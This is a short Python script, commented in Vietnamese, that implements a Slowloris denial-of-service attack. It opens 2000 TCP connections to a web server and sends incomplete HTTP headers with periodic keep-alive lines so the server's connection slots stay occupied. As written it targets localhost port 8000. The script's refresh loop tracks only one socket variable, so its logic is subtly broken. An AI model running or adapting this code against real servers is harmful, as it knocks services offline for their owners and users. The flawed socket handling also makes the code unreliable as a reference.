import socket
import random
import time

#Định nghĩa một hàm slowloris với ba đối số đầu vào là địa chỉ IP của máy chủ web, cổng kết nối và số lượng sockets
def slowloris(ip, port, sockets):

#Tạo một danh sách các header  gửi tới máy chủ web
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Accept-language: en-US,en,q=0.5",
        "Connection: Keep-Alive"
    ]

#Tạo ra số lượng sockets được chỉ định và gửi các header đến máy chủ web
    for i in range(sockets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        for header in headers:
            s.send(bytes(f"{header}\r\n".encode("utf-8")))
        print(f"Socket {i} sent headers")

#Sử dụng một vòng lặp vô hạn để giữ Socket mở và gửi các header Keep-Alive để giữ kết nối mở    
    while True:
        time.sleep(15)
        print("Refreshing sockets...")

#Sử dụng hàm try để bắt các ngoại lệ liên quan đến việc gửi header Keep-Alive. 
#Nếu không thể gửi header Keep-Alive, Socket sẽ được đóng và mở lại.    
        for i in range(sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                print(f"Sent keep-alive header on socket {i}")
            except socket.error:
                print(f"Socket {i} timed out or failed to send keep-alive header, closing...")
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                for header in headers:
                    s.send(bytes(f"{header}\r\n".encode("utf-8")))
                print(f"Reopened socket {i} and sent headers")
#Gọi hàm slowloris với địa chỉ IP của máy chủ web, cổng kết nối và số lượng sockets
slowloris("localhost", 8000, 2000)
